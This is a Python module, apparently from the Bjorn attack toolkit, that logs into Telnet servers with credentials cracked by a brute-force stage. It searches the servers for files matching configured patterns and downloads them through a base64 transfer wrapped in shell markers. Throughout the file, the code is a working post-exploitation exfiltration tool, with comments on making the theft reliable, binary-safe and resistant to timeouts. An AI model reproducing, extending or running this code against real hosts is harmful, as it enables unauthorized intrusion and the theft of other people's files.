"""
steal_files_telnet.py - Connects to remote Telnet servers with cracked credentials, finds files
matching the steal_file_* config, and downloads them binary-safe over a base64 transfer.

#12: the scaffolding (parent gate, latch reset, credential load, watchdog timer, credential loop,
outcome contract, #6 budgets) lives in base_stealer.BaseStealer. This file is the Telnet adapter.

NOTE on the transfer design
---------------------------
Telnet gives us a raw interactive shell, not a file channel. The previous code did
`cat {file}` + `read_until(b"$")`, which (a) truncated at the first `$` in the payload,
(b) corrupted every binary, and (c) captured the shell prompt/echo into the file.

This version transfers via base64 delimited by markers chosen to be unambiguous:
  - The markers contain underscores, which are outside the base64 alphabet
    (A-Za-z0-9+/=), so they can never appear inside the encoded payload.
  - The marker literals are split with '' in the remote command, so the shell's
    echo of the command line does not contain the contiguous marker we scan for —
    only the echo command's *output* does. read_until therefore skips the echo and
    stops at the real marker.
"""

import base64
import logging
import os
import telnetlib

from base_stealer import BaseStealer, MAX_FILE_BYTES
from logger import Logger
from shared import SharedData

# Configure the logger
logger = Logger(name="steal_files_telnet.py", level=logging.DEBUG)

# Define the necessary global variables
b_class = "StealFilesTelnet"
b_module = "steal_files_telnet"
b_status = "steal_files_telnet"
b_parent = "TelnetBruteforce"
b_port = 23

# Connect/read timeouts (seconds). Bounded so a black-holed host can't wedge the worker.
_CONNECT_TIMEOUT = 15
_READ_TIMEOUT = 30

# Transfer markers. Underscores keep them out of the base64 alphabet, so they can never
# collide with encoded payload bytes; the remote command splits the literals with '' so
# the shell's command-echo never contains the contiguous marker we read_until on.
_BEGIN = b"__BJORN_B64_BEGIN__"
_END = b"__BJORN_B64_END__"


class StealFilesTelnet(BaseStealer):
    """Steal files from Telnet servers over a marker-delimited base64 transfer."""

    CRED_FILE_ATTR = "telnetfile"
    LOOT_SUBDIR = "telnet"
    CONNECTED_FLAG = "telnet_connected"
    LOGGER = logger

    def open_session(self, ip, username, password):
        """Log in. Every read is bounded so a host that never sends a prompt cannot hang us.

        Raises rather than returning None on failure: the base treats an exception as "try the
        next credential", and a None would only turn into an AttributeError one frame later.
        """
        tn = telnetlib.Telnet(ip, timeout=_CONNECT_TIMEOUT)
        tn.read_until(b"login: ", timeout=_CONNECT_TIMEOUT)
        tn.write(username.encode('ascii') + b"\n")
        if password:
            tn.read_until(b"Password: ", timeout=_CONNECT_TIMEOUT)
            tn.write(password.encode('ascii') + b"\n")
        tn.read_until(b"$", timeout=_CONNECT_TIMEOUT)  # consume the initial prompt (best effort)
        self.mark_connected()
        logger.info(f"Connected to {ip} via Telnet with username {username}")
        return tn

    def _capture(self, tn, remote_cmd):
        """Run remote_cmd and return the bytes printed between our markers, or None on timeout.

        The markers are prompt-independent (no reliance on `$`/`#`) and echo-proof (the command
        line's echo carries the split `__BJORN''_...` form, not the contiguous marker), so
        read_until lands on the real output rather than the echo.
        """
        wrapped = f"echo __BJORN''_B64_BEGIN__; {remote_cmd}; echo __BJORN''_B64_END__\n"
        tn.write(wrapped.encode('ascii'))
        tn.read_until(_BEGIN, timeout=_READ_TIMEOUT)   # skip command echo, reach the begin marker
        blob = tn.read_until(_END, timeout=_READ_TIMEOUT)
        if not blob.endswith(_END):
            return None
        return blob[:-len(_END)]

    @staticmethod
    def _shell_quote(path):
        """Single-quote a path, escaping any embedded quote the POSIX way ('\\'')."""
        return path.replace("'", "'\\''")

    def _remote_size(self, tn, quoted):
        """Remote file size via `wc -c`, or None if the target can't answer.

        Worth the extra round trip: this transport reads the whole file into memory as base64
        before anything can measure it, so a size cap applied *after* the transfer would let a
        multi-gigabyte file OOM a 512 MB Pi Zero on the way to being rejected. Unknown size falls
        through to the post-decode check — smaller protection, but never worse than before.
        """
        out = self._capture(tn, f"wc -c < '{quoted}' 2>/dev/null")
        try:
            return int(out.strip())
        except (AttributeError, ValueError):
            return None

    def find_files(self, conn, dir_path):
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File search interrupted due to orchestrator exit.")
                return []
            out = self._capture(conn, f"find '{self._shell_quote(dir_path)}' -type f")
            if out is None:
                logger.error(f"Timed out listing files under {dir_path}")
                return []
            matching = []
            for path in out.decode('ascii', errors='ignore').splitlines():
                if self.shared_data.orchestrator_should_exit:
                    logger.info("File search interrupted due to orchestrator exit.")
                    return []
                path = path.strip()
                if self.matches_wanted(path):
                    matching.append(path)
            logger.info(f"Found {len(matching)} matching files in {dir_path}")
            return matching
        except Exception as e:
            logger.error(f"Error finding files on Telnet: {e}")
            return []

    def steal_file(self, conn, remote_file, local_dir):
        """Download one file, binary-safe, within the #6 budgets."""
        try:
            if self.shared_data.orchestrator_should_exit:
                logger.info("File stealing process interrupted due to orchestrator exit.")
                return
            if not self.check_budget(local_dir):
                return

            quoted = self._shell_quote(remote_file)
            size = self._remote_size(conn, quoted)
            if size is not None and not self.fits_budget(size):
                logger.warning(
                    f"Skipping {remote_file}: {size} bytes exceeds the per-file cap "
                    f"({MAX_FILE_BYTES}) or the remaining per-run budget")
                return

            out = self._capture(conn, f"base64 '{quoted}' 2>/dev/null")
            if out is None:
                logger.error(f"Timed out reading {remote_file} (no end marker)")
                return
            # validate=False (default) discards the newlines base64 inserts for line wrapping.
            data = base64.b64decode(out)
            if not data:
                logger.warning(
                    f"No data for {remote_file} (empty file, or base64 unavailable on target)")
                return
            if size is None and not self.fits_budget(len(data)):
                logger.warning(
                    f"Discarding {remote_file}: {len(data)} bytes over budget, and the target "
                    f"could not report a size before the transfer")
                return

            local_file_path = os.path.join(local_dir, os.path.relpath(remote_file, '/'))
            os.makedirs(os.path.dirname(local_file_path) or local_dir, exist_ok=True)
            with open(local_file_path, 'wb') as f:
                f.write(data)
            self.note_bytes(len(data))
            logger.success(
                f"Downloaded file from {remote_file} to {local_file_path} ({len(data)} bytes)")
        except Exception as e:
            logger.error(f"Error downloading file {remote_file} from Telnet: {e}")


if __name__ == "__main__":
    try:
        shared_data = SharedData()
        steal_files_telnet = StealFilesTelnet(shared_data)
        # Add test or demonstration calls here
    except Exception as e:
        logger.error(f"Error in main execution: {e}")
